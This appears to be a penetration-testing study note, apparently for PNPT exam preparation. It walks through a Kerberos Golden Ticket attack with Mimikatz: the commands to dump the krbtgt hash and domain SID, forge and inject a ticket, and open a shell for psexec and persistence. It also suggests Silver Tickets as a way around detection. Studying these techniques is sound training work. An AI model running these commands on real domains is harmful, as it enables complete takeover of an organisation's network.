#### Golden Ticket Attacks

When we compromise the krbtgt account (kerberos ticket granting ticket), we own the domain  
We can request access to any resource or system on the domain  
Golden Ticket == complete access to every machine  

Utilized within Mimikatz  
&ensp;`mimikatz # privilege::debug`   - This will be run everytime in mimikatz.exe  
&ensp;`mimikatz # lsadump::lsa /inject /name:krbtgt`   This will dump the ntlm hash for the krbtgt account as well as the SID for the domain.  You can keep this in a txt file.  
&ensp;`mimikatz # kerberos::golden /User:Administrator /domain:PNPT.local /sid:<this is the domains SID> /krbtgt:<NTLM hash for krbtgt account> /id:500 /ptt`  
&ensp;&ensp;The user does not have to be a real user.  `/id:500` is the RID.  `/ptt` is pass the ticket.  Once this is run you should get a message stating the ticket was successfully created.  
&ensp;`mimikatz # misc::cmd`    This should open a command line window utilizing the session with the golden ticket we just created.  At this point, you can even download psexec.exe and run it on the device, you have complete control.  You also have persistance since you have a golden ticket.  

  

Also look into "Silver Tickets" since golden tickets are starting to get picked up.
